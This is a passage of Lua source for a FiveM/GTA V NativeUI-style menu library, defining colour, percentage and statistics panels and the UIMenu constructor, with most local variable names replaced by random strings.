         then
            if IsDisabledControlJustPressed(0, 24) then
                self:CurrentSelection(self.Data.Pagination.Min + Index - 1)
            end
        end
    end
end
function UIMenuColourPanel:GoLeft()
    if #self.Data.Items > self.Data.Pagination.Total + 1 then
        if self:CurrentSelection() <= self.Data.Pagination.Min + 1 then
            if self:CurrentSelection() == 1 then
                self.Data.Pagination.Min = #self.Data.Items - (self.Data.Pagination.Total + 1)
                self.Data.Pagination.Max = #self.Data.Items
                self.Data.Index = 1000 - (1000 % #self.Data.Items)
                self.Data.Index = self.Data.Index + (#self.Data.Items - 1)
                self:UpdateSelection()
            else
                self.Data.Pagination.Min = self.Data.Pagination.Min - 1
                self.Data.Pagination.Max = self.Data.Pagination.Max - 1
                self.Data.Index = self.Data.Index - 1
                self:UpdateSelection()
            end
        else
            self.Data.Index = self.Data.Index - 1
            self:UpdateSelection()
        end
    else
        self.Data.Index = self.Data.Index - 1
        self:UpdateSelection()
    end
end
function UIMenuColourPanel:GoRight()
    if #self.Data.Items > self.Data.Pagination.Total + 1 then
        if self:CurrentSelection() >= self.Data.Pagination.Max then
            if self:CurrentSelection() == #self.Data.Items then
                self.Data.Pagination.Min = 0
                self.Data.Pagination.Max = self.Data.Pagination.Total + 1
                self.Data.Index = 1000 - (1000 % #self.Data.Items)
                self:UpdateSelection()
            else
                self.Data.Pagination.Max = self.Data.Pagination.Max + 1
                self.Data.Pagination.Min = self.Data.Pagination.Max - (self.Data.Pagination.Total + 1)
                self.Data.Index = self.Data.Index + 1
                self:UpdateSelection()
            end
        else
            self.Data.Index = self.Data.Index + 1
            self:UpdateSelection()
        end
    else
        self.Data.Index = self.Data.Index + 1
        self:UpdateSelection()
    end
end
function UIMenuColourPanel:Draw()
    if self.Data.Enabled then
        self.Background:Size(431 + self.ParentItem:SetParentMenu().WidthOffset, 112)
        self.Background:Draw()
        if self.EnableArrow ~= false then
            self.LeftArrow:Draw()
            self.RightArrow:Draw()
        end
        self.Text:Draw()
        self.SelectedRectangle:Draw()
        for Index = 1, #self.Bar do
            self.Bar[Index]:Draw()
        end
        self:Functions()
    end
end
UIMenuPercentagePanel = setmetatable({}, UIMenuPercentagePanel)
UIMenuPercentagePanel.__index = UIMenuPercentagePanel
UIMenuPercentagePanel.__call = function()
    return "UIMenuPanel", "UIMenuPercentagePanel"
end
function UIMenuPercentagePanel.New(UMp6DYoy1K7L7P, TRLs)
    local bI = {
        Data = {Enabled = true},
        Background = Sprite.New("commonmenu", "gradient_bgd", 0, 0, 431, 76),
        ActiveBar = UIResRectangle.New(0, 0, 413, 10, 245, 245, 245, 255),
        BackgroundBar = UIResRectangle.New(0, 0, 413, 10, 87, 87, 87, 255),
        Text = {
            Min = UIResText.New(UMp6DYoy1K7L7P or "0%", 0, 0, 0.35, 255, 255, 255, 255, 0, "Centre"),
            Max = UIResText.New("100%", 0, 0, 0.35, 255, 255, 255, 255, 0, "Centre"),
            Title = UIResText.New(TRLs or "Opacity", 0, 0, 0.35, 255, 255, 255, 255, 0, "Centre")
        },
        Audio = {Slider = "CONTINUOUS_SLIDER", Library = "HUD_FRONTEND_DEFAULT_SOUNDSET", Id = nil},
        ParentItem = nil
    }
    return setmetatable(bI, UIMenuPercentagePanel)
end
function UIMenuPercentagePanel:SetParentItem(jev74od8dV)
    if jev74od8dV() == "UIMenuItem" then
        self.ParentItem = jev74od8dV
    else
        return self.ParentItem
    end
end
function UIMenuPercentagePanel:Enabled(vh_WFKbmtsdztSCRPO)
    if type(vh_WFKbmtsdztSCRPO) == "boolean" then
        self.Data.Enabled = vh_WFKbmtsdztSCRPO
    else
        return self.Data.Enabled
    end
end
function UIMenuPercentagePanel:Position(bS)
    if tonumber(bS) then
        local H3, jlF44jUElnfp = self.ParentItem:Offset().X, self.ParentItem:SetParentMenu().WidthOffset
        self.Background:Position(H3, bS)
        self.ActiveBar:Position(H3 + (jlF44jUElnfp / 2) + 9, 50 + bS)
        self.BackgroundBar:Position(H3 + (jlF44jUElnfp / 2) + 9, 50 + bS)
        self.Text.Min:Position(H3 + (jlF44jUElnfp / 2) + 25, 15 + bS)
        self.Text.Max:Position(H3 + (jlF44jUElnfp / 2) + 398, 15 + bS)
        self.Text.Title:Position(H3 + (jlF44jUElnfp / 2) + 215.5, 15 + bS)
    end
end
function UIMenuPercentagePanel:Percentage(uouCK)
    if tonumber(uouCK) then
        local j5DI2StCgX = ((uouCK < 0.0) and 0.0) or ((uouCK > 1.0) and 1.0 or uouCK)
        self.ActiveBar:Size(self.BackgroundBar.Width * j5DI2StCgX, self.ActiveBar.Height)
    else
        local G7GFhPLS6hyDR = {X = 0, Y = 0}
        if self.ParentItem:SetParentMenu().Settings.ScaleWithSafezone then
            G7GFhPLS6hyDR = GetSafeZoneBounds()
        end
        local lKFQg_DASNCt = (math.round(GetControlNormal(0, 239) * 1920) - G7GFhPLS6hyDR.X) - self.ActiveBar.X
        return math.round(
            ((lKFQg_DASNCt >= 0 and lKFQg_DASNCt <= 413) and lKFQg_DASNCt or ((lKFQg_DASNCt < 0) and 0 or 413)) /
                self.BackgroundBar.Width,
            2
        )
    end
end
function UIMenuPercentagePanel:UpdateParent(XPraUDrJsz94S)
    local BldqsD, wP6pu = self.ParentItem()
    if wP6pu == "UIMenuListItem" then
        local Bt6DtGFSYiN2Oueb = self.ParentItem:FindPanelItem()
        if Bt6DtGFSYiN2Oueb then
            self.ParentItem.Items[Bt6DtGFSYiN2Oueb].Value[self.ParentItem:FindPanelIndex(self)] = XPraUDrJsz94S
            self.ParentItem:Index(Bt6DtGFSYiN2Oueb)
            self.ParentItem.Base.ParentMenu.OnListChange(
                self.ParentItem.Base.ParentMenu,
                self.ParentItem,
                self.ParentItem._Index
            )
            self.ParentItem.OnListChanged(self.ParentItem.Base.ParentMenu, self.ParentItem, self.ParentItem._Index)
        else
            local tu8UBqrAEkpzd = self.ParentItem:FindPanelIndex(self)
            for Index = 1, #self.ParentItem.Items do
                if type(self.ParentItem.Items[Index]) == "table" then
                    if not self.ParentItem.Items[Index].Panels then
                        self.ParentItem.Items[Index].Panels = {}
                    end
                    self.ParentItem.Items[Index].Panels[tu8UBqrAEkpzd] = XPraUDrJsz94S
                else
                    self.ParentItem.Items[Index] = {
                        Name = tostring(self.ParentItem.Items[Index]),
                        Value = self.ParentItem.Items[Index],
                        Panels = {[tu8UBqrAEkpzd] = XPraUDrJsz94S}
                    }
                end
            end
            self.ParentItem.Base.ParentMenu.OnListChange(
                self.ParentItem.Base.ParentMenu,
                self.ParentItem,
                self.ParentItem._Index
            )
            self.ParentItem.OnListChanged(self.ParentItem.Base.ParentMenu, self.ParentItem, self.ParentItem._Index)
        end
    elseif wP6pu == "UIMenuItem" then
        self.ParentItem.ActivatedPanel(self.ParentItem.ParentMenu, self.ParentItem, self, XPraUDrJsz94S)
    end
end
function UIMenuPercentagePanel:Functions()
    local SPJqHSkjsP6gDsd6AU = {X = 0, Y = 0}
    if self.ParentItem:SetParentMenu().Settings.ScaleWithSafezone then
        SPJqHSkjsP6gDsd6AU = GetSafeZoneBounds()
    end
    if
        IsMouseInBounds(
            self.BackgroundBar.X + SPJqHSkjsP6gDsd6AU.X,
            self.BackgroundBar.Y - 4 + SPJqHSkjsP6gDsd6AU.Y,
            self.BackgroundBar.Width,
            self.BackgroundBar.Height + 8
        )
     then
        if IsDisabledControlJustPressed(0, 24) then
            if not self.Pressed then
                self.Pressed = true
                Citizen.CreateThread(
                    function()
                        self.Audio.Id = GetSoundId()
                        PlaySoundFrontend(self.Audio.Id, self.Audio.Slider, self.Audio.Library, 1)
                        while IsDisabledControlPressed(0, 24) and
                            IsMouseInBounds(
                                self.BackgroundBar.X + SPJqHSkjsP6gDsd6AU.X,
                                self.BackgroundBar.Y - 4 + SPJqHSkjsP6gDsd6AU.Y,
                                self.BackgroundBar.Width,
                                self.BackgroundBar.Height + 8
                            ) do
                            Citizen.Wait(0)
                            local dcqeY =
                                (math.round(GetControlNormal(0, 239) * 1920) - SPJqHSkjsP6gDsd6AU.X) - self.ActiveBar.X
                            self.ActiveBar:Size(
                                ((dcqeY >= 0 and dcqeY <= 413) and dcqeY or ((dcqeY < 0) and 0 or 413)),
                                self.ActiveBar.Height
                            )
                        end
                        StopSound(self.Audio.Id)
                        ReleaseSoundId(self.Audio.Id)
                        self.Pressed = false
                    end
                )
                Citizen.CreateThread(
                    function()
                        while IsDisabledControlPressed(0, 24) and
                            IsMouseInBounds(
                                self.BackgroundBar.X + SPJqHSkjsP6gDsd6AU.X,
                                self.BackgroundBar.Y - 4 + SPJqHSkjsP6gDsd6AU.Y,
                                self.BackgroundBar.Width,
                                self.BackgroundBar.Height + 8
                            ) do
                            Citizen.Wait(75)
                            local aG0x1ncArG =
                                (math.round(GetControlNormal(0, 239) * 1920) - SPJqHSkjsP6gDsd6AU.X) - self.ActiveBar.X
                            self:UpdateParent(
                                math.round(
                                    ((aG0x1ncArG >= 0 and aG0x1ncArG <= 413) and aG0x1ncArG or
                                        ((aG0x1ncArG < 0) and 0 or 413)) / self.BackgroundBar.Width,
                                    2
                                )
                            )
                        end
                    end
                )
            end
        end
    end
end
function UIMenuPercentagePanel:Draw()
    if self.Data.Enabled then
        self.Background:Size(431 + self.ParentItem:SetParentMenu().WidthOffset, 76)
        self.Background:Draw()
        self.BackgroundBar:Draw()
        self.ActiveBar:Draw()
        self.Text.Min:Draw()
        self.Text.Max:Draw()
        self.Text.Title:Draw()
        self:Functions()
    end
end
UIMenuStatisticsPanel = setmetatable({}, UIMenuStatisticsPanel)
UIMenuStatisticsPanel.__index = UIMenuStatisticsPanel
UIMenuStatisticsPanel.__call = function()
    return "UIMenuPanel", "UIMenuStatisticsPanel"
end
function UIMenuStatisticsPanel.New()
    local VYcobdF = {
        Background = UIResRectangle.New(0, 0, 431, 47, 0, 0, 0, 170),
        Divider = true,
        ParentItem = nil,
        Items = {}
    }
    return setmetatable(VYcobdF, UIMenuStatisticsPanel)
end
function UIMenuStatisticsPanel:AddStatistics(CBIiGBVA0)
    local kgeCutaulM1h4 = {
        Text = UIResText.New(CBIiGBVA0 or "", 0, 0, 0.35, 255, 255, 255, 255, 0, "Left"),
        BackgroundProgressBar = UIResRectangle.New(0, 0, 200, 10, 255, 255, 255, 100),
        ProgressBar = UIResRectangle.New(0, 0, 100, 10, 255, 255, 255, 255),
        Divider = {
            [1] = UIResRectangle.New(0, 0, 2, 10, 0, 0, 0, 255),
            [2] = UIResRectangle.New(0, 0, 2, 10, 0, 0, 0, 255),
            [3] = UIResRectangle.New(0, 0, 2, 10, 0, 0, 0, 255),
            [4] = UIResRectangle.New(0, 0, 2, 10, 0, 0, 0, 255),
            [5] = UIResRectangle.New(0, 0, 2, 10, 0, 0, 0, 255)
        }
    }
    table.insert(self.Items, kgeCutaulM1h4)
end
function UIMenuStatisticsPanel:SetParentItem(hhlg8eH)
    if hhlg8eH() == "UIMenuItem" then
        self.ParentItem = hhlg8eH
    else
        return self.ParentItem
    end
end
function UIMenuStatisticsPanel:SetPercentage(XADqcCdLDs3Eg, OMhr)
    if XADqcCdLDs3Eg ~= nil then
        if OMhr <= 0 then
            self.Items[XADqcCdLDs3Eg].ProgressBar.Width = 0
        else
            if OMhr <= 100 then
                self.Items[XADqcCdLDs3Eg].ProgressBar.Width = OMhr * 2.0
            else
                self.Items[XADqcCdLDs3Eg].ProgressBar.Width = 100 * 2.0
            end
        end
    else
        error("Missing arguments, ItemID")
    end
end
function UIMenuStatisticsPanel:GetPercentage(YQpfq)
    if YQpfq ~= nil then
        return self.Items[YQpfq].ProgressBar.Width * 2.0
    else
        error("Missing arguments, ItemID")
    end
end
function UIMenuStatisticsPanel:Position(JBGCCvkWiaiA7ObWh)
    if tonumber(JBGCCvkWiaiA7ObWh) then
        local dB, Fq_7_0BKm = self.ParentItem:Offset().X, self.ParentItem:SetParentMenu().WidthOffset
        self.Background:Position(dB, JBGCCvkWiaiA7ObWh)
        for i = 1, #self.Items do
            local fO_yxAwXYynki = 40 * i
            self.Items[i].Text:Position(dB + (Fq_7_0BKm / 2) + 13, JBGCCvkWiaiA7ObWh - 34 + fO_yxAwXYynki)
            self.Items[i].BackgroundProgressBar:Position(
                dB + (Fq_7_0BKm / 2) + 200,
                JBGCCvkWiaiA7ObWh - 22 + fO_yxAwXYynki
            )
            self.Items[i].ProgressBar:Position(dB + (Fq_7_0BKm / 2) + 200, JBGCCvkWiaiA7ObWh - 22 + fO_yxAwXYynki)
            if self.Divider ~= false then
                for _ = 1, #self.Items[i].Divider, 1 do
                    local AIZKJGH9Cq_chNBvkepgT = _ * 40
                    self.Items[i].Divider[_]:Position(
                        dB + (Fq_7_0BKm / 2) + 200 + AIZKJGH9Cq_chNBvkepgT,
                        JBGCCvkWiaiA7ObWh - 22 + fO_yxAwXYynki
                    )
                    self.Background:Size(431 + self.ParentItem:SetParentMenu().WidthOffset, 47 + fO_yxAwXYynki - 39)
                end
            end
        end
    end
end
function UIMenuStatisticsPanel:Draw()
    self.Background:Draw()
    for i = 1, #self.Items do
        self.Items[i].Text:Draw()
        self.Items[i].BackgroundProgressBar:Draw()
        self.Items[i].ProgressBar:Draw()
        for _ = 1, #self.Items[i].Divider do
            self.Items[i].Divider[_]:Draw()
        end
    end
end
UIMenu = setmetatable({}, UIMenu)
UIMenu.__index = UIMenu
UIMenu.__call = function()
    return "UIMenu"
end
function UIMenu.New(
    L1mUCgTUhINEW,
    _3pb9gGDmbYYY,
    K7kuEZBniEuVmbqk,
    JtOHYGo2OECFZ,
    K4IXtmutoiZuM,
    PRUeeR,
    aB74f8wWAiHs__loCwq,
    jj3UMzAS,
    c2svO1cclyl,
    nsNhHYxaINWDknY2JosH,
    IIx6kwNwOuKkNdqRQ5)
    local itqqy5xlY5bKV, FMLap0uf = tonumber(K7kuEZBniEuVmbqk) or 0, tonumber(JtOHYGo2OECFZ) or 0
    if L1mUCgTUhINEW ~= nil then
        L1mUCgTUhINEW = tostring(L1mUCgTUhINEW) or ""
    else
        L1mUCgTUhINEW = ""
    end
    if _3pb9gGDmbYYY ~= nil then
        _3pb9gGDmbYYY = tostring(_3pb9gGDmbYYY) or ""
    else
        _3pb9gGDmbYYY = ""
    end
    if K4IXtmutoiZuM ~= nil then
        K4IXtmutoiZuM = tostring(K4IXtmutoiZuM) or "commonmenu"
    else
        K4IXtmutoiZuM = "commonmenu"
    end
    if PRUeeR ~= nil then
        PRUeeR = tostring(PRUeeR) or "interaction_bgd"
    else
        PRUeeR = "interaction_bgd"
    end
    if aB74f8wWAiHs__loCwq ~= nil then
        aB74f8wWAiHs__loCwq = tonumber(aB74f8wWAiHs__loCwq) or 0
    else
        aB74f8wWAiHs__loCwq = 0
    end
    if jj3UMzAS ~= nil then
        jj3UMzAS = tonumber(jj3UMzAS) or 255
    else
        jj3UMzAS = 255
    end
    if c2svO1cclyl ~= nil then
        c2svO1cclyl = tonumber(c2svO1cclyl) or 255
    else
        c2svO1cclyl = 255
    end
    if nsNhHYxaINWDknY2JosH ~= nil then
        nsNhHYxaINWDknY2JosH = tonumber(nsNhHYxaINWDknY2JosH) or 255
    else
        nsNhHYxaINWDknY2JosH = 255
    end
    if IIx6kwNwOuKkNdqRQ5 ~= nil then
        IIx6kwNwOuKkNdqRQ5 = tonumber(IIx6kwNwOuKkNdqRQ5) or 255
    else
        IIx6kwNwOuKkNdqRQ5 = 255
    end
    local In04lu1dy8s = {
        Logo = Sprite.New(
            K4IXtmutoiZuM,
            PRUeeR,
            0 + itqqy5xlY5bKV,
            0 + FMLap0uf,
            431,
            107,
            aB74f8wWAiHs__loCwq,
            jj3UMzAS,
            c2svO1cclyl,
            nsNhHYxaINWDknY2JosH,
            IIx6kwNwOuKkNdqRQ5
        ),
        Banner = nil,
        Title = UIResText.New(L1mUCgTUhINEW, 215 + itqqy5xlY5bKV, 20 + FMLap0uf, 1.0, 255, 255, 255, 255, 6, 1, 0),
        BetterSize = true,
        Subtitle = {ExtraY = 0},
        WidthOffset = 0,
        Position = {X = itqqy5xlY5bKV, Y = FMLap0uf},
        Pagination = {Min = 0, Max = 10, Total = 9},
        PageCounter = {isCustom = false, PreText = ""},
        Extra = {},
        Description = {},
        Items = {},
        Windows = {},
        Children = {},
        Controls = {
            Back = {Enabled = true},
            Select = {Enabled = true},
            Left = {Enabled = true},
            Right = {Enabled = true},
            Up = {Enabled = true},
            Down = {Enabled = true}
        },
        ParentMenu = nil,
        ParentItem = nil,
        _Visible = false,
        ActiveItem = 1000,
        Dirty = false,
        ReDraw = true,
        InstructionalScaleform = RequestScaleformMovie("INSTRUCTIONAL_BUTTONS"),
        InstructionalButtons = {},
        OnIndexChange = function(PTFKGq_73d6, N2fQAZbikcTjkBleNZ5n)
        end,
        OnListChange = function(IPdPy12PU0PJ, D7g4doJzRdU7pM8m9, Yni)
        end,
        OnSliderChange = function(ojVpLDW, EUM_Lnm_n0CJ6Eoukgk, AUhbMRdCz)
        end,
        OnProgressChange = function(Tt9IgMAADnD4SnWEauZ0, XIVRVaSWx8, ZjME)
        end,
        OnCheckboxChange = function(tykOsTvb9u_h6cU, cl83tAVphaD, BgjF6hKM)
        end,
        OnListSelect = function(NEDnd_JTJJpLD_p, W0ZOmK9B2, ivY4O4TYe)
        end,
        OnSliderSelect = function(e0QE_vzRlw7dauFsL_CA, xWWis6oxNqx2ndsY7hL, MX10MO7XkoWOJa2nN)
        end,
        OnProgressSelect = function(h8q5JGKesCPqvnBV, gOm6D297bkTs3X8psd, i797)
        end,
        OnItemSelect = function(BnSohKOqyH7, zerbk1fD6L, LezG7E9PDGZ30PTOh2ZR)
        end,
        OnMenuChanged = function(HsDO063NFgOotO, Ax2u, vPNsc4K6y4fEjr_BT)
        end,
        OnMenuClosed = function(si)
        end,
        Settings = {
            InstructionalButtons = true,
            MultilineFormats = true,
            ScaleWithSafezone = true,
            ResetCursorOnOpen = true,
            MouseControlsEnabled = false,
            MouseEdgeEnabled = false,
            ControlDisablingEnabled = true,
            Audio = {
                Library = "HUD_FRONTEND_DEFAULT_SOUNDSET",
                UpDown = "NAV_UP_DOWN",
                LeftRight = "NAV_LEFT_RIGHT",
                Select = "SELECT",
                Back = "BACK",
                Error = "ERROR"
            },
            EnabledControls = {
                Controller = {{0, 25}, {0, 24}},
                Keyboard = {
                    {1, 1},
                    {1, 2},
                    {1, 270},
                    {1, 271},
                    {1, 272},
                    {1, 273},
                    {0, 201},
                    {0, 195},
                    {0, 196},
                    {0, 187},
                    {0, 188},
                    {0, 189},
                    {0, 190},
                    {0, 202},
                    {0, 217},
                    {0, 242},
                    {0, 241},
                    {0, 239},
                    {0, 240},
                    {0, 31},
                    {0, 30},
                    {0, 21},
                    {0, 22},
                    {0, 23},
                    {0, 75},
                    {0, 71},
                    {0, 72},
                    {0, 59},
                    {0, 89},
                    {0, 9},
                    {0, 8},
                    {0, 90},
                    {0, 76}
                }
            }
        }
    }
    if _3pb9gGDmbYYY ~= "" and _3pb9gGDmbYYY ~= nil then
        In04lu1dy8s.Subtitle.Rectangle =
            UIResRectangle.New(0 + In04lu1dy8s.Position.X, 107 + In04lu1dy8s.Position.Y, 431, 37, 0, 0, 0, 255)
        In04lu1dy8s.Subtitle.Text =
            UIResText.New(
            _3pb9gGDmbYYY,
            8 + In04lu1dy8s.Position.X,
            110 + In04lu1dy8s.Position.Y,
            0.35,
            245,
            245,
            245,
            255,
            0
        )
        In04lu1dy8s.Subtitle.BackupText = _3pb9gGDmbYYY
        In04lu1dy8s.Subtitle.Formatted = false
        if string.starts(_3pb9gGDmbYYY, "~") then
            In04lu1dy8s.PageCounter.PreText = string.sub(_3pb9gGDmbYYY, 1, 3)
        end
        In04lu1dy8s.PageCounter.Text =
            UIResText.New(
            "",
            425 + In04lu1dy8s.Position.X,
            110 + In04lu1dy8s.Position.Y,
            0.35,
            245,
            245,
            245,
            255,
            0,
            "Right"
        )
        In04lu1dy8s.Subtitle.ExtraY = 37
    end
    In04lu1dy8s.ArrowSprite =
        Sprite.New(
        "commonmenu",
        "shop_arrows_upanddown",
        190 + In04lu1dy8s.Position.X,
        147 + 37 * (In04lu1dy8s.Pagination.Total + 1) + In04lu1dy8s.Position.Y - 37 + In04lu1dy8s.Subtitle.ExtraY,
        40,
        40
    )
    In04lu1dy8s.Extra.Up =
        UIResRectangle.New(
        0 + In04lu1dy8s.Position.X,
        144 + 38 * (In04lu1dy8s.Pagination.Total + 1) + In04lu1dy8s.Position.Y - 37 + In04lu1dy8s.Subtitle.ExtraY,
        431,
        18,
        0,
        0,
        0,
        200
    )
    In04lu1dy8s.Extra.Down =
        UIResRectangle.New(
        0 + In04lu1dy8s.Position.X,
        144 + 18 + 38 * (In04lu1dy8s.Pagination.Total + 1) + In04lu1dy8s.Position.Y - 37 + In04lu1dy8s.Subtitle.ExtraY,
        431,
        18,
        0,
        0,
        0,
        200
    )
    In04lu1dy8s.Description.Bar = UIResRectangle.New(In04lu1dy8s.Position.X, 123, 431, 4, 0, 0, 0, 255)
    In04lu1dy8s.Description.Rectangle = Sprite.New("commonmenu", "gradient_bgd", In04lu1dy8s.Position.X, 127, 431, 30)
    In04lu1dy8s.Description.Text = UIResText.New("Description", In04lu1dy8s.Position.X + 5, 125, 0.35)
    In04lu1dy8s.Background =
        Sprite.New(
        "commonmenu",
        "gradient_bgd",
        In04lu1dy8s.Position.X,
        144 + In04lu1dy8s.Position.Y - 37 + In04lu1dy8s.Subtitle.ExtraY,
        290,
        25
    )
    if In04lu1dy8s.BetterSize == true then
        In04lu1dy8s.WidthOffset = math.floor(tonumber(69))
        In04lu1dy8s.Logo:Size(431 + In04lu1dy8s.WidthOffset, 107)
        In04lu1dy8s.Title:Position(
            ((In04lu1dy8s.WidthOffset + 431) / 2) + In04lu1dy8s.Position.X,
            20 + In04lu1dy8s.Position.Y
        )
        if In04lu1dy8s.Subtitle.Rectangle ~= nil then
            In04lu1dy8s.Subtitle.Rectangle:Size(431 + In04lu1dy8s.WidthOffset + 100, 37)
            In04lu1dy8s.PageCounter.Text:Position(
                425 + In04lu1dy8s.Position.X + In04lu1dy8s.WidthOffset,
                110 + In04lu1dy8s.Position.Y
            )
        end
        if In04lu1dy8s.Banner ~= nil then
            In04lu1dy8s.Banner:Size(431 + In04lu1dy8s.WidthOffset, 107)
        end
    end
    Citizen.CreateThread(
        function()
            if not HasScaleformMovieLoaded(In04lu1dy8s.InstructionalScaleform) then
                In04lu1dy8s.InstructionalScaleform = RequestScaleformMovie("INSTRUCTIONAL_BUTTONS")
                while not HasScaleformMovieLoaded(In04lu1dy8s.InstructionalScaleform) do
                    Citizen.Wait(0)
                end
            end
        end
    )
    return setmetatable(In04lu1dy8s, UIMenu)
end
function UIMenu:SetMenuWidthOffset(S3msy8)
    if tonumber(S3msy8) then
        self.WidthOffset = math.floor(tonumber(S3msy8) + tonumber(70))
        self.Logo:Size(431 + self.WidthOffset, 107)
        self.Title:Position(((self.WidthOffset + 431) / 2) + self.Position.X, 20 + self.Position.Y)
        if self.Subtitle.Rectangle ~= nil then
            self.Subtitle.Rectangle:Size(431 + self.WidthOffset + 100, 37)
            self.PageCounter.Text:Position(425 + self.Position.X + self.WidthOffset, 110 + self.Position.Y)
        end
        if self.Banner ~= nil then
            self.Banner:Size(431 + self.WidthOffset, 107)
        end
    end
end
function UIMenu:DisEnableControls(cn1MWbtl9)
    if cn1MWbtl9 then
        EnableAllControlActions(2)
    else
        DisableAllControlActions(2)
    end
    if cn1MWbtl9 then
        return
    else
        if Controller() then
            for Index = 1, #self.Settings.EnabledControls.Controller do
                EnableControlAction(
                    self.Settings.EnabledControls.Controller[Index][1],
                    self.Settings.EnabledControls.Controller[Index][2],
                    true
                )
            end
        else
            for Index = 1, #self.Settings.EnabledControls.Keyboard do
                EnableControlAction(
                    self.Settings.EnabledControls.Keyboard[Index][1],
                    self.Settings.EnabledControls.Keyboard[Index][2],
                    true
                )
            end
        end
    end
end
function UIMenu:InstructionalButtons(ZslfODLSVdluqPikjW)
    if ZslfODLSVdluqPikjW ~= nil then
        self.Settings.InstrucitonalButtons = tobool(ZslfODLSVdluqPikjW)
    end
end
function UIMenu:SetBannerSprite(t3ZlrBFkc1_, wuWQFcAnbGQ7TOY)
    if t3ZlrBFkc1_() == "Sprite" then
        self.Logo = t3ZlrBFkc1_
        self.Logo:Size(431 + self.WidthOffset, 107)
        self.Logo:Position(self.Position.X, self.Position.Y)
        self.Banner = nil
        if wuWQFcAnbGQ7TOY then
            for bxPCzD65Rxds, y5 in pairs(self.Children) do
                y5.Logo = t3ZlrBFkc1_
                y5.Logo:Size(431 + self.WidthOffset, 107)
                y5.Logo:Position(self.Position.X, self.Position.Y)
                y5.Banner = nil
            end
        end
    end
end
function UIMenu:SetBannerRectangle(Se_KJzkNxLRDp, SVjRW27EkK)
    if Se_KJzkNxLRDp() == "Rectangle" then
        self.Banner = Se_KJzkNxLRDp
        self.Banner:Size(431 + self.WidthOffset, 107)
        self.Banner:Position(self.Position.X, self.Position.Y)
        self.Logo = nil
        if SVjRW27EkK then
            for J4F5alTLA_kuPwrEvBTRg, ummDj3rVftpmzZU2Gop in pairs(self.Children) do
                ummDj3rVftpmzZU2Gop.Banner = Se_KJzkNxLRDp
                ummDj3rVftpmzZU2Gop.Banner:Size(431 + self.WidthOffset, 107)
                ummDj3rVftpmzZU2Gop:Position(self.Position.X, self.Position.Y)
                ummDj3rVftpmzZU2Gop.Logo = nil
            end
        end
    end
end
function UIMenu:CurrentSelection(MxW5jGCH6aJKadhRv)
    if tonumber(MxW5jGCH6aJKadhRv) then
        if #self.Items == 0 then
            self.ActiveItem = 0
        end
        self.Items[self:CurrentSelection()]:Selected(false)
        self.ActiveItem = 1000000 - (1000000 % #self.Items) + tonumber(MxW5jGCH6aJKadhRv)
        if self:CurrentSelection() > self.Pagination.Max then
            self.Pagination.Min = self:CurrentSelection() - self.Pagination.Total
            self.Pagination.Max = self:CurrentSelection()
        elseif self:CurrentSelection() < self.Pagination.Min then
            self.Pagination.Min = self:CurrentSelection()
            self.Pagination.Max = self:CurrentSelection() + self.Pagination.Total
        end
    else
        if #self.Items == 0 then
            return 1
        else
            if self.ActiveItem % #self.Items == 0 then
                return 1
            else
                return self.ActiveItem % #self.Items + 1
            end
        end
    end
end
function UIMenu:CalculateWindowHeight()
    local GkDNXTNwlT = 0
    for i = 1, #self.Windows do
        GkDNXTNwlT = GkDNXTNwlT + self.Windows[i].Background:Size().Height
    end
    return GkDNXTNwlT
end
function UIMenu:CalculateItemHeightOffset(W0WZsKuoVRzmf1B)
    if W0WZsKuoVRzmf1B.Base then
        return W0WZsKuoVRzmf1B.Base.Rectangle.Height
    else
        return W0WZsKuoVRzmf1B.Rectangle.Height
    end
end
function UIMenu:CalculateItemHeight()
    local GixP62 = 0 + self.Subtitle.ExtraY - 37
    for i = self.Pagination.Min + 1, self.Pagination.Max do
        local mCiAU = self.Items[i]
        if mCiAU ~= nil then
            GixP62 = GixP62 + self:CalculateItemHeightOffset(mCiAU)
        end
    end
    return GixP62
end
function UIMenu:RecalculateDescriptionPosition()
    local mn6lSuCD = self:CalculateWindowHeight()
    self.Description.Bar:Position(self.Position.X, 149 + self.Position.Y + mn6lSuCD)
    self.Description.Rectangle:Position(self.Position.X, 149 + self.Position.Y + mn6lSuCD)
    self.Description.Text:Position(self.Position.X + 8, 155 + self.Position.Y + mn6lSuCD)
    self.Description.Bar:Size(431 + self.WidthOffset, 4)
    self.Description.Rectangle:Size(431 + self.WidthOffset, 30)
    self.Description.Bar:Position(
        self.Position.X,
        self:CalculateItemHeight() + ((#self.Items > (self.Pagination.Total + 1)) and 37 or 0) +
            self.Description.Bar:Position().Y
    )
    self.Description.Rectangle:Position(
        self.Position.X,
        self:CalculateItemHeight() + ((#self.Items > (self.Pagination.Total + 1)) and 37 or 0) +
            self.Description.Rectangle:Position().Y
    )
    self.Description.Text:Position(
        self.Position.X + 8,
        self:CalculateItemHeight() + ((#self.Items > (self.Pagination.Total + 1)) and 37 or 0) +
            self.Description.Text:Position().Y
    )
end
function UIMenu:CaclulatePanelPosition(jS)
    local EdMITPUS = self:CalculateWindowHeight() + 149 + self.Position.Y
    if jS then
        EdMITPUS = EdMITPUS + self.Description.Rectangle:Size().Height + 5
    end
    return self:CalculateItemHeight() + ((#self.Items > (self.Pagination.Total + 1)) and 37 or 0) + EdMITPUS
end
function UIMenu:AddWindow(mGfr)
    if mGfr() == "UIMenuWindow" then
        mGfr:SetParentMenu(self)
        mGfr:Offset(self.Position.X, self.Position.Y)
        table.insert(self.Windows, mGfr)
        self.ReDraw = true
        self:RecalculateDescriptionPosition()
    end
end
function UIMenu:RemoveWindowAt(XF1C)
    if tonumber(XF1C) then
        if self.Windows[XF1C] then
            table.remove(self.Windows, XF1C)
            self.ReDraw = true
            self:RecalculateDescriptionPosition()
        end
    end
end
function UIMenu:AddItem(Lk6piKcdTYjiN)
    Items = Lk6piKcdTYjiN
    if #Items == 0 then
        if Lk6piKcdTYjiN() == "UIMenuItem" then
            local OELyU5knROV7YgNB = self:CurrentSelection()
            Lk6piKcdTYjiN:SetParentMenu(self)
            Lk6piKcdTYjiN:Offset(self.Position.X, self.Position.Y)
            Lk6piKcdTYjiN:Position((#self.Items * 25) - 37 + self.Subtitle.ExtraY)
            table.insert(self.Items, Lk6piKcdTYjiN)
            self:RecalculateDescriptionPosition()
            self:CurrentSelection(OELyU5knROV7YgNB)
        end
    end
    for i = 1, #Items, 1 do
        Lk6piKcdTYjiN = Items[i]
        if Lk6piKcdTYjiN() == "UIMenuItem" then
            local yYLkat_ = self:CurrentSelection()
            Lk6piKcdTYjiN:SetParentMenu(self)
            Lk6piKcdTYjiN:Offset(self.Position.X, self.Position.Y)
